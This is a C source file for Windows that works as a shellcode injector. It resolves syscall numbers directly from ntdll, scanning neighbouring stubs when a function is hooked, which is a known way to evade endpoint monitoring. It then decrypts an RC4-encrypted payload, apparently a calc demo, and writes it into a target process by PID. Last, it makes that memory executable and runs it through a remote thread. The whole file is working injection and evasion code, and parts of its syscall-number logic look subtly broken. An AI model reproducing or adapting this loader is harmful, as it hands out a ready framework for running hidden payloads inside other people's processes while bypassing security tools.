#include <Windows.h>
#include <stdio.h>
#include "define.h"

#define pid 20788

SystemFunction032 jodRC4;

WORD GetSSN(HMODULE hNTDLL, char* Procedure) {
	DWORD FunctionSSN = 0;
	UINT_PTR addr = 0;

	addr = (UINT_PTR)GetProcAddress(hNTDLL, Procedure);

	if (*((PBYTE)addr) == 0x4c && *((PBYTE)addr + 1) == 0x8b && *((PBYTE)addr + 2) == 0xd1 && *((PBYTE)addr + 3) == 0xb8 && *((PBYTE)addr + 6) == 0x00 && *((PBYTE)addr + 7) == 0x00) {
		BYTE high = *((PBYTE)addr + 4);
		BYTE low = *((PBYTE)addr + 5);
		WORD sCALL = (high << 8) | low;
		return high;
	}

	if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 || *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {
		for (int i = 1; i <= 500; i++) {
			PBYTE newADDR = (PBYTE)addr - i * 32;
			if (*((PBYTE)newADDR) == 0x4c && *((PBYTE)newADDR + 1) == 0x8b && *((PBYTE)newADDR + 2) == 0xd1 && *((PBYTE)newADDR + 3) == 0xb8 && *((PBYTE)newADDR + 6) == 0x00 && *((PBYTE)newADDR + 7) == 0x00) {
				BYTE high = *((PBYTE)newADDR + 5);
				BYTE low = *((PBYTE)newADDR + 4);
				WORD sCALL = (high << 8) | low + i;
				return high;
			}
		}
	}

	if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 || *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {
		for (int i = 1; i <= 500; i++) {
			PBYTE newADDR = (PBYTE)addr + i * 32;
			if (*((PBYTE)newADDR) == 0x4c && *((PBYTE)newADDR + 1) == 0x8b && *((PBYTE)newADDR + 2) == 0xd1 && *((PBYTE)newADDR + 3) == 0xb8 && *((PBYTE)newADDR + 6) == 0x00 && *((PBYTE)newADDR + 7) == 0x00) {
				BYTE high = *((PBYTE)newADDR + 5);
				BYTE low = *((PBYTE)newADDR + 4);
				WORD sCALL = (high << 8) | low - i;
				return high;
			}
		}
	}

	FunctionSSN = *((PBYTE)(addr + 4));
	return FunctionSSN;
}

QWORD GetSyscallAdr(HMODULE hNTDLL, char* Procedure) {
	DWORD FunctionSSN = 0;
	UINT_PTR addr = 0;

	addr = (UINT_PTR)GetProcAddress(hNTDLL, Procedure);

	if (*((PBYTE)addr) == 0x4c && *((PBYTE)addr + 1) == 0x8b && *((PBYTE)addr + 2) == 0xd1 && *((PBYTE)addr + 3) == 0xb8 && *((PBYTE)addr + 6) == 0x00 && *((PBYTE)addr + 7) == 0x00) {
		LPVOID scall = (LPVOID)((INT_PTR)addr + 0x12);
		return (QWORD)scall;
	}

	if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 || *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {
		for (int i = 1; i <= 500; i++) {
			PBYTE newADDR = (PBYTE)addr - i * 32;
			if (*((PBYTE)newADDR) == 0x4c && *((PBYTE)newADDR + 1) == 0x8b && *((PBYTE)newADDR + 2) == 0xd1 && *((PBYTE)newADDR + 3) == 0xb8 && *((PBYTE)newADDR + 6) == 0x00 && *((PBYTE)newADDR + 7) == 0x00) {
				LPVOID scall = (LPVOID)((INT_PTR)addr + 0x12);
				return (QWORD)scall;
			}
		}
	}

	if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 || *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {
		for (int i = 1; i <= 500; i++) {
			PBYTE newADDR = (PBYTE)addr + i * 32;
			if (*((PBYTE)newADDR) == 0x4c && *((PBYTE)newADDR + 1) == 0x8b && *((PBYTE)newADDR + 2) == 0xd1 && *((PBYTE)newADDR + 3) == 0xb8 && *((PBYTE)newADDR + 6) == 0x00 && *((PBYTE)newADDR + 7) == 0x00) {
				LPVOID scall = (LPVOID)((INT_PTR)addr + 0x12);
				return (QWORD)scall;
			}
		}
	}

	QWORD SyscallAddr = (QWORD)((PBYTE)addr + 18);
	return SyscallAddr;
}


void Populate() {
	HANDLE hNtdll = GetModuleHandleW(L"ntdll");

	NtOpenProcessSSN = GetSSN(hNtdll, "NtOpenProcess");
	NtAllocateVirtualMemoryExSSN = GetSSN(hNtdll, "NtAllocateVirtualMemoryEx");
	NtProtectVirtualMemorySSN = GetSSN(hNtdll, "NtProtectVirtualMemory");
	NtWriteVirtualMemorySSN = GetSSN(hNtdll, "NtWriteVirtualMemory");
	NtCreateThreadExSSN = GetSSN(hNtdll, "NtCreateThreadEx");
	NtCloseSSN = GetSSN(hNtdll, "NtClose");

	NtOpenProcessSyscall = GetSyscallAdr(hNtdll, "NtOpenProcess");
	NtAllocateVirtualMemoryExSyscall = GetSyscallAdr(hNtdll, "NtAllocateVirtualMemoryEx");
	NtProtectVirtualMemorySyscall = GetSyscallAdr(hNtdll, "NtProtectVirtualMemory");
	NtWriteVirtualMemorySyscall = GetSyscallAdr(hNtdll, "NtWriteVirtualMemory");
	NtCreateThreadExSyscall = GetSyscallAdr(hNtdll, "NtCreateThreadEx");
	NtCloseSyscall = GetSyscallAdr(hNtdll, "NtClose");

	jodRC4 = (SystemFunction032)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction032");
}

int main(int argc, char* argv[]) {
	int PID = 0;

	if (argc < 2) {
#if _DEBUG
		ok("Will have to pull from code ugh");
		PID = pid;
		Populate();
#else
		error("Provide the PID of the process to inject calc into\n%s <PID>", argv[0]);
		return 1;
#endif
	}
	else {
		PID = atoi(argv[1]);
		Populate();
	}

	/*HANDLE hNTDLL = GetModuleHandleW(L"NTDLL");
	if (hNTDLL == NULL) {
		error("Couldn't get handle to ntdll.dll");
		yolo();
	}
	else {
		ok("Got the Handle to NTDLL --> 0x%p", hNTDLL);
	}*/

	OBJECT_ATTRIBUTES oa = { sizeof(oa),NULL };
	CLIENTID cid = { NULL };
	cid.UniqueProcess = (HANDLE)PID;
	HANDLE hProcess = NULL;

	NTSTATUS ntError = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
	if (hProcess == NULL && ntError != STATUS_SUCCESS) {
		error("Could not get a handle on the process with PID %d.", PID);
		yolo();
	}
	else {
		ok("Got the handle to the process --> 0x%p", hProcess);
	}
#if _DEBUG
	//getch();
#endif

	size_t sz = 128;
	LPVOID rBuffer = NULL;
	ntError = NtAllocateVirtualMemoryEx(hProcess, &rBuffer, &sz, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE, NULL, 0);
	if (ntError != STATUS_SUCCESS) {
		error("Could not reserve a memory space");
		yolo();
	}
	else {
		ok("Memory Allocated at 0x%p", &rBuffer);
	}

#if _DEBUG
	//getch();
#endif

#if _FALSE //Why did I even write this..
	info("Populating the jodProtect API");

	ULONG old;
	ntError = NtProtectVirtualMemory(hProcess, &rBuffer, szCalc, (MEM_RESERVE | MEM_COMMIT), &old);
	if (ntError != STATUS_SUCCESS) {
		error("Could not change memory protections");
		yolo();
	}
	else {
		ok("Memory Protections changed");
	}
#endif
	ustring Key = { (DWORD)szRc4Key, (DWORD)szRc4Key, rc4Key };
	ustring shellBuff = { (DWORD)szCalc,(DWORD)szCalc, calc };
	jodRC4(&shellBuff, &Key);

	ntError = NtWriteVirtualMemory(hProcess, rBuffer, (PVOID)calc, szCalc, 0);
	if (ntError != STATUS_SUCCESS) {
		error("Could not write shellcode to process memory");
		yolo();
	}
	else {
		ok("Wrote shellcode to memory");
		jodRC4(&shellBuff, &Key);
	}
#if _DEBUG
	//getch();
#endif



	ULONG old;
	ntError = NtProtectVirtualMemory(hProcess, &rBuffer, &szCalc, PAGE_EXECUTE_READ, &old);
	if (ntError != STATUS_SUCCESS) {
		error("Could not change memory protections");
		yolo();
	}
	else {
		ok("Memory Protections changed");
	}
#if _DEBUG
	//getch();
#endif

	HANDLE tHandle = NULL;
	ntError = NtCreateThreadEx(&tHandle, THREAD_ALL_ACCESS, &oa, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);
	if (ntError != STATUS_SUCCESS) {
		error("Could not Start a Thread");
		yolo();
	}
	else {
		ok("Thread Started");
	}


	info("Closing all handles");
	NtClose(hProcess);

	ok("Exiting :)");

	return 0;
}